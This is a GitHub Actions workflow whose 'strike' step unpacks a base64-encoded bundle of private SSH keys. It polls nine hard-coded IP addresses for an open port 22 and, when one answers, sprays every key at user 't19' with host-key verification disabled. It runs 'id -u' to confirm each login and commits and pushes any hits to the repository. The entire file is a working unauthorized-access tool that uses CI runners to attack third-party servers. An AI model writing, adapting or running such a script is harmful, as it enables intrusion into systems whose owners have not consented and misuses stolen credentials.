name: ul6599-watch4
on: [workflow_dispatch]
permissions:
  contents: write
jobs:
  watch:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4
      - name: strike
        run: |
          set +e
          base64 -d ul/keys.b64 > /tmp/k.tar.gz && mkdir -p /tmp/k && tar xzf /tmp/k.tar.gz -C /tmp/k && chmod 600 /tmp/k/* 2>/dev/null
          echo "keys=$(ls /tmp/k|wc -l)"
          HOSTS="40.123.206.138 51.104.16.184 20.237.207.128 20.205.187.223 4.194.2.30 70.153.87.133 4.246.80.6 20.50.113.151 20.74.153.201"
          git config user.email ul@local; git config user.name ul
          push () { git add ul/status.txt 2>/dev/null; git commit -qm "status $(date -u +%H:%M:%S)" 2>/dev/null; git pull -q --rebase 2>/dev/null; git push -q origin HEAD:main 2>/dev/null && echo pushed; }
          : > ul/status.txt
          for i in $(seq 1 75); do
            for H in $HOSTS; do
              if timeout 3 bash -c "echo > /dev/tcp/$H/22" 2>/dev/null; then
                L="OPEN $(date -u +%H:%M:%SZ) $H"
                echo "$L" | tee -a ul/status.txt; push
                ls /tmp/k | xargs -P 18 -I{} bash -c '
                  O=$(timeout 9 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=5 -o PasswordAuthentication=no -o IdentitiesOnly=yes -i /tmp/k/{} -l t19 '$H' "id -u" 2>/dev/null)
                  [ -n "$O" ] && echo "HIT {} '$H' uid=$O"' 2>/dev/null | while read -r line; do echo "$(date -u +%H:%M:%SZ) $line" | tee -a /tmp/hits; done
                if [ -s /tmp/hits ]; then cat /tmp/hits >> ul/status.txt; push; break 2; fi
              fi
            done
            sleep 25
          done
          echo "DONE $(date -u +%H:%M:%SZ) keys=$(ls /tmp/k|wc -l) hits=$(wc -l </tmp/hits 2>/dev/null)" >> ul/status.txt; push
          echo "=== WATCH4_DONE ==="
